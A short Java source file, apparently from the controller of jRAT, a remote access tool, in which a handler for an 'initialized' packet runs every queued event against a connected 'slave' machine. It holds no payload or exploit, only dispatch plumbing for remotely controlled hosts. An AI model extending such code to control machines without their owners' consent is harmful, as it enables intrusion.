package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.events.Event;
import io.jrat.client.events.Events;

import java.io.DataInputStream;

public class Packet36Initialized extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		for (Event event : Events.queue.values()) {
			event.perform(slave);
		}
	}

}
